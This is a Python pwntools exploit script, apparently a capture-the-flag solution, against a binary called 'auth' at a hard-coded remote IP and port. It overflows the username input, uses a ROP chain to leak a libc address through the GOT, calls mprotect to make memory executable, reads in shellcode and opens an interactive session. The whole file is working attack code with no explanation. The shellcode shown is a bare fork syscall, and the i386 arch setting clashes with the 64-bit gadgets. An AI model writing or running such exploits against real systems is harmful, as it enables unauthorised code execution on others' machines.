from pwn import *
import sys

remote_ip,port = '69.90.132.134', 3317
binary = ['./auth','.']
brkpts = '''
set follow-fork-mode child
b*0x401545
'''

#context.terminal=['tmux', 'splitw', '-h']
context.arch = "i386"
context.log_level = 'debug'

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    #io = process(binary)#, env = {"LD_PRELOAD" : "./libc.so.6"})
    #gdb.attach(io, brkpts)
    io = process(binary)
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

rbp = 0x603500
pop_rdi = 0x4019a3
username = 0x4014c0
printf = 0x400d36
pop_rsi = 0x4017fa
got = 0x603090
ret = 0x400538
fatal = 0x400f90
username_print = 0x4014d7
pop_rdx_rbx_rbp = 0x400e8f
read = 0x400d00
retf = 0x400418
username_scanf = 0x4014eb

if __name__ == "__main__":
    gdb.attach(io,brkpts)
    payload = "admin".ljust(0x30,"\x00")
    payload += flat([
        0x400600-0x10,
        pop_rdi,
        1,
        pop_rsi,
        got,
        username_print
    ])
    sla("Username: ", payload)
    leak = u64(re(6).ljust(8,"\x00"))
    log.info("Libc : "+hex(leak))
    libc_base = leak - 0x10bd80
    mprotect = libc_base + 0xf8ce0
    read = libc_base + 0xeef40
    payload = "admin".ljust(0x30,"\x00")
    payload += flat([
        0x400600-0x10,
        pop_rdi,
        0x603000,
        pop_rsi,
        0x1000,
        pop_rdx_rbx_rbp,
        0x7,
        0x400600-0x10,
        0x0,
        mprotect,
        pop_rdi,
        0,
        pop_rsi,
        0x603500,
        pop_rdx_rbx_rbp,
        0x208,
        0x400600-0x10,
        0x0,
        read,
        0x603500
    ])
    sl(payload)
    shellcode = asm("""
        mov eax, 2
        int 0x80
    """)
    sl(shellcode)
    io.interactive()
